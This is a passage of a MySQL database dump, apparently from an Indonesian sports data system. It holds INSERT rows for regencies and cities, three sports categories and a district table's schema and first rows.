INSERT INTO `sdp_master_kabkot` VALUES (463, NULL, NULL, 'KABUPATEN PINRANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (464, NULL, NULL, 'KABUPATEN ENREKANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (465, NULL, NULL, 'KABUPATEN LUWU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:59', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (466, NULL, NULL, 'KABUPATEN TANA TORAJA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (467, NULL, NULL, 'KABUPATEN LUWU UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (468, NULL, NULL, 'KABUPATEN LUWU TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (469, NULL, NULL, 'KABUPATEN TORAJA UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (470, NULL, NULL, 'KOTA MAKASSAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (471, NULL, NULL, 'KOTA PAREPARE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (472, NULL, NULL, 'KOTA PALOPO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (473, NULL, NULL, 'KABUPATEN BUTON', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (474, NULL, NULL, 'KABUPATEN MUNA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (475, NULL, NULL, 'KABUPATEN KONAWE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (476, NULL, NULL, 'KABUPATEN KOLAKA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (477, NULL, NULL, 'KABUPATEN KONAWE SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (478, NULL, NULL, 'KABUPATEN BOMBANA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (479, NULL, NULL, 'KABUPATEN WAKATOBI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (480, NULL, NULL, 'KABUPATEN KOLAKA UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (481, NULL, NULL, 'KABUPATEN BUTON UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (482, NULL, NULL, 'KABUPATEN KONAWE UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (483, NULL, NULL, 'KABUPATEN KOLAKA TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (484, NULL, NULL, 'KABUPATEN KONAWE KEPULAUAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (485, NULL, NULL, 'KABUPATEN MUNA BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (486, NULL, NULL, 'KABUPATEN BUTON TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (487, NULL, NULL, 'KABUPATEN BUTON SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (488, NULL, NULL, 'KOTA KENDARI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (489, NULL, NULL, 'KOTA BAUBAU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:00', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (490, '75', '02', 'KABUPATEN BOALEMO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:27:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (491, '75', '01', 'KABUPATEN GORONTALO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:27:15', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (492, '75', '04', 'KABUPATEN POHUWATO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:27:55', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (493, '75', '03', 'KABUPATEN BONE BOLANGO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:27:41', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (494, '75', '05', 'KABUPATEN GORONTALO UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:28:12', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (495, '75', '71', 'KOTA GORONTALO', NULL, NULL, '1', NULL, NULL, 1, '2019-10-21 11:28:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (496, NULL, NULL, 'KABUPATEN MAJENE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (497, NULL, NULL, 'KABUPATEN POLEWALI MANDAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (498, NULL, NULL, 'KABUPATEN MAMASA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (499, NULL, NULL, 'KABUPATEN MAMUJU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (500, NULL, NULL, 'KABUPATEN MAMUJU UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (501, NULL, NULL, 'KABUPATEN MAMUJU TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (502, NULL, NULL, 'KABUPATEN MALUKU TENGGARA BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (503, NULL, NULL, 'KABUPATEN MALUKU TENGGARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (504, NULL, NULL, 'KABUPATEN MALUKU TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (505, NULL, NULL, 'KABUPATEN BURU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (506, NULL, NULL, 'KABUPATEN KEPULAUAN ARU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (507, NULL, NULL, 'KABUPATEN SERAM BAGIAN BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (508, NULL, NULL, 'KABUPATEN SERAM BAGIAN TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (509, NULL, NULL, 'KABUPATEN MALUKU BARAT DAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (510, NULL, NULL, 'KABUPATEN BURU SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (511, NULL, NULL, 'KOTA AMBON', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (512, NULL, NULL, 'KOTA TUAL', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (513, NULL, NULL, 'KABUPATEN HALMAHERA BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (514, NULL, NULL, 'KABUPATEN HALMAHERA TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (515, NULL, NULL, 'KABUPATEN KEPULAUAN SULA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (516, NULL, NULL, 'KABUPATEN HALMAHERA SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (517, NULL, NULL, 'KABUPATEN HALMAHERA UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (518, NULL, NULL, 'KABUPATEN HALMAHERA TIMUR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (519, NULL, NULL, 'KABUPATEN PULAU MOROTAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (520, NULL, NULL, 'KABUPATEN PULAU TALIABU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (521, NULL, NULL, 'KOTA TERNATE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (522, NULL, NULL, 'KOTA TIDORE KEPULAUAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (523, NULL, NULL, 'KABUPATEN FAKFAK', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (524, NULL, NULL, 'KABUPATEN KAIMANA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:01', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (525, NULL, NULL, 'KABUPATEN TELUK WONDAMA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (526, NULL, NULL, 'KABUPATEN TELUK BINTUNI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (527, NULL, NULL, 'KABUPATEN MANOKWARI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (528, NULL, NULL, 'KABUPATEN SORONG SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (529, NULL, NULL, 'KABUPATEN SORONG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (530, NULL, NULL, 'KABUPATEN RAJA AMPAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (531, NULL, NULL, 'KABUPATEN TAMBRAUW', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (532, NULL, NULL, 'KABUPATEN MAYBRAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (533, NULL, NULL, 'KABUPATEN MANOKWARI SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (534, NULL, NULL, 'KABUPATEN PEGUNUNGAN ARFAK', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (535, NULL, NULL, 'KOTA SORONG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (536, NULL, NULL, 'KABUPATEN MERAUKE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (537, NULL, NULL, 'KABUPATEN JAYAWIJAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (538, NULL, NULL, 'KABUPATEN JAYAPURA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (539, NULL, NULL, 'KABUPATEN NABIRE', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (540, NULL, NULL, 'KABUPATEN KEPULAUAN YAPEN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (541, NULL, NULL, 'KABUPATEN BIAK NUMFOR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (542, NULL, NULL, 'KABUPATEN PANIAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (543, NULL, NULL, 'KABUPATEN PUNCAK JAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (544, NULL, NULL, 'KABUPATEN MIMIKA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (545, NULL, NULL, 'KABUPATEN BOVEN DIGOEL', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (546, NULL, NULL, 'KABUPATEN MAPPI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (547, NULL, NULL, 'KABUPATEN ASMAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (548, NULL, NULL, 'KABUPATEN YAHUKIMO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:02', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (549, NULL, NULL, 'KABUPATEN PEGUNUNGAN BINTANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (550, NULL, NULL, 'KABUPATEN TOLIKARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (551, NULL, NULL, 'KABUPATEN SARMI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (552, NULL, NULL, 'KABUPATEN KEEROM', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (553, NULL, NULL, 'KABUPATEN WAROPEN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (554, NULL, NULL, 'KABUPATEN SUPIORI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (555, NULL, NULL, 'KABUPATEN MAMBERAMO RAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (556, NULL, NULL, 'KABUPATEN NDUGA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (557, NULL, NULL, 'KABUPATEN LANNY JAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (558, NULL, NULL, 'KABUPATEN MAMBERAMO TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (559, NULL, NULL, 'KABUPATEN YALIMO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (560, NULL, NULL, 'KABUPATEN PUNCAK', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (561, NULL, NULL, 'KABUPATEN DOGIYAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (563, NULL, NULL, 'KABUPATEN DEIYAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (564, NULL, NULL, 'KOTA JAYAPURA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:33:03', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (565, '11', '09', 'Simeulue', NULL, NULL, '1', 1, '2019-10-19 22:03:29', 1, '2019-10-20 14:12:28', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (566, '21', '71', 'KOTA BATAM', NULL, NULL, '1', 1, '2019-10-21 13:31:53', 1, '2019-10-21 13:32:09', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (567, '18', '10', 'Piringsewu', NULL, NULL, '1', 1, '2019-11-11 11:21:32', NULL, '2019-11-11 11:21:32', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (568, '13', '77', 'Pariaman', NULL, NULL, '1', 1, '2019-11-11 11:50:28', NULL, '2019-11-11 11:50:28', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (569, '73', '10', 'Pangkajene Kepulauan', NULL, NULL, '1', 1, '2019-11-11 12:15:17', NULL, '2019-11-11 12:15:17', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (570, '14', '10', 'Kepulauan Meranti', NULL, NULL, '1', 1, '2019-11-11 12:23:59', NULL, '2019-11-11 12:23:59', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (571, '18', '12', 'Tulang Bawang Barat', NULL, NULL, '1', 1, '2019-11-11 12:33:32', NULL, '2019-11-11 12:33:32', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (572, '16', '71', 'Palembang', NULL, NULL, '1', 1, '2019-11-11 12:39:25', NULL, '2019-11-11 12:39:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (573, '16', '10', 'Ogan Ilir', NULL, NULL, '1', 1, '2019-11-11 12:43:47', 1, '2019-11-11 12:43:57', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (574, '74', '71', 'Kendari', NULL, NULL, '1', 1, '2019-11-11 12:57:27', NULL, '2019-11-11 12:57:27', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (575, '16', '72', 'Pagar Alam', NULL, NULL, '1', 1, '2019-11-11 13:05:39', NULL, '2019-11-11 13:05:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (576, '52', '01', 'Lombok Barat', NULL, NULL, '1', 1, '2019-11-11 19:14:25', NULL, '2019-11-11 19:14:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (577, '18', '71', 'Bandar Lampung', '', '', '1', 1, '2020-09-14 21:53:11', 1, '2020-09-14 23:17:31', '::1');

-- ----------------------------
-- Table structure for sdp_master_kategori
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_kategori`;
CREATE TABLE `sdp_master_kategori`  (
  `kategori_id` int(11) NOT NULL AUTO_INCREMENT,
  `kategori_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kategori_deskripsi` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `kategori_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `kategori_createdby` int(11) DEFAULT NULL,
  `kategori_createddate` datetime(0) DEFAULT NULL,
  `kategori_udpatedby` int(11) DEFAULT NULL,
  `kategori_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `kategori_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`kategori_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_kategori
-- ----------------------------
INSERT INTO `sdp_master_kategori` VALUES (1, 'Olahraga Pendidikan', 'Kategori untuk pendidikan', '1', NULL, NULL, NULL, '2019-10-13 02:08:56', NULL);
INSERT INTO `sdp_master_kategori` VALUES (2, 'Olahraga Rekreasi', 'Kategori untuk olahraga rekreasi', '1', NULL, NULL, NULL, '2019-10-13 02:09:49', NULL);
INSERT INTO `sdp_master_kategori` VALUES (3, 'Olahraga Prestasi', 'Kategori untuk olahraga prestasi', '1', NULL, NULL, NULL, '2019-10-13 02:10:20', NULL);

-- ----------------------------
-- Table structure for sdp_master_kecamatan
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_kecamatan`;
CREATE TABLE `sdp_master_kecamatan`  (
  `kecamatan_id` int(11) NOT NULL AUTO_INCREMENT,
  `kecamatan_provinsi_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kecamatan_kabkot_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kecamatan_kode` char(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kecamatan_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kecamatan_latitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kecamatan_longtitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kecamatan_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `kecamatan_createdby` int(11) DEFAULT NULL,
  `kecamatan_createddate` datetime(0) DEFAULT NULL,
  `kecamatan_updatedby` int(11) DEFAULT NULL,
  `kecamatan_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `kecamatan_ip` varchar(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`kecamatan_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 87 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_kecamatan
-- ----------------------------
INSERT INTO `sdp_master_kecamatan` VALUES (1, '11', '01', '01', 'Bakongan', NULL, NULL, '1', 1, '2019-10-20 14:14:54', NULL, '2019-10-20 14:14:54', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (2, '11', '01', '15', 'Bakongan Timur', NULL, NULL, '1', 1, '2019-10-20 14:17:59', NULL, '2019-10-20 14:17:59', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (3, '11', '01', '03', 'Kluet Selatan', NULL, NULL, '1', 1, '2019-10-20 14:18:22', NULL, '2019-10-20 14:18:22', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (4, '11', '01', '13', 'Kluet Tengah', NULL, NULL, '1', 1, '2019-10-20 14:18:38', NULL, '2019-10-20 14:18:38', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (5, '11', '01', '14', 'Kluet Timur', NULL, NULL, '1', 1, '2019-10-20 14:18:51', NULL, '2019-10-20 14:18:51', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (6, '11', '01', '02', 'Kluet Utara', NULL, NULL, '1', 1, '2019-10-20 14:19:03', NULL, '2019-10-20 14:19:03', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (7, '11', '01', '17', 'Kota Bahagia', NULL, NULL, '1', 1, '2019-10-20 14:19:13', NULL, '2019-10-20 14:19:13', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (8, '11', '01', '04', 'Labuhan Haji', NULL, NULL, '1', 1, '2019-10-20 14:19:31', NULL, '2019-10-20 14:19:31', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (9, '11', '01', '12', 'Labuhan Haji Barat', NULL, NULL, '1', 1, '2019-10-20 14:19:47', NULL, '2019-10-20 14:19:47', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (10, '11', '01', '11', 'Labuhan Haji Timur', NULL, NULL, '1', 1, '2019-10-20 14:19:57', NULL, '2019-10-20 14:19:57', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (11, '11', '01', '05', 'Meukek', NULL, NULL, '1', 1, '2019-10-20 14:20:09', NULL, '2019-10-20 14:20:09', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (12, '11', '01', '10', 'Pasi Raja', NULL, NULL, '1', 1, '2019-10-20 14:20:22', NULL, '2019-10-20 14:20:22', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (13, '11', '01', '06', 'Samadua', NULL, NULL, '1', 1, '2019-10-20 14:20:32', NULL, '2019-10-20 14:20:32', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (14, '11', '01', '07', 'Sawang', NULL, NULL, '1', 1, '2019-10-20 14:20:46', NULL, '2019-10-20 14:20:46', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (15, '11', '01', '08', 'Tapaktuan', NULL, NULL, '1', 1, '2019-10-20 14:20:56', NULL, '2019-10-20 14:20:56', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (16, '11', '01', '09', 'Trumon', NULL, NULL, '1', 1, '2019-10-20 14:21:06', NULL, '2019-10-20 14:21:06', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (17, '11', '01', '18', 'Trumon Tengah', NULL, NULL, '1', 1, '2019-10-20 14:21:16', NULL, '2019-10-20 14:21:16', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (18, '11', '01', '16', 'Trumon Timur', NULL, NULL, '1', 1, '2019-10-20 14:21:25', NULL, '2019-10-20 14:21:25', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (19, '32', '13', '11', 'Pamanukan', NULL, NULL, '1', 1, '2019-10-24 15:14:45', NULL, '2019-10-24 15:14:45', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (20, '32', '12', '10', 'Karangampel', NULL, NULL, '1', 1, '2019-10-30 21:52:15', NULL, '2019-10-30 21:52:15', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (21, '32', '12', '09', 'Krangkeng', NULL, NULL, '1', 1, '2019-10-30 21:55:23', NULL, '2019-10-30 21:55:23', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (22, '32', '13', '15', 'Compreng', NULL, NULL, '1', 1, '2019-11-04 18:48:27', NULL, '2019-11-04 18:48:27', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (23, '32', '12', '29', 'Pasekan', NULL, NULL, '1', 1, '2019-11-04 18:51:39', NULL, '2019-11-04 18:51:39', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (24, '32', '12', '11', 'Juntinyuat', NULL, NULL, '1', 1, '2019-11-04 18:53:49', NULL, '2019-11-04 18:53:49', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (25, '32', '76', '02', 'Cimanggis', NULL, NULL, '1', 1, '2019-11-04 18:56:01', NULL, '2019-11-04 18:56:01', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (26, '32', '01', '29', 'Ciomas', NULL, NULL, '1', 1, '2019-11-04 18:58:36', NULL, '2019-11-04 18:58:36', '::1');
INSERT INTO `sdp_master_kecamatan` VALUES (27, '32', '09', '27', 'Susukan', NULL, NULL, '1', 1, '2019-11-04 19:00:29', NULL, '2019-11-04 19:00:29', '::1');
